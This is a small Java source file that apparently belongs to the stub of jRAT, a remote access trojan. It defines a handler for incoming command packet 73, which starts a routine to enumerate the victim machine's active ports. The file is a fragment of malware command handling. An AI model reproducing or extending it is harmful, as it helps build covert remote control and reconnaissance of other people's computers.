package su.jrat.stub.packets.incoming;

import su.jrat.stub.ActivePorts;

public class Packet73ActivePorts extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new ActivePorts().start();
	}

}
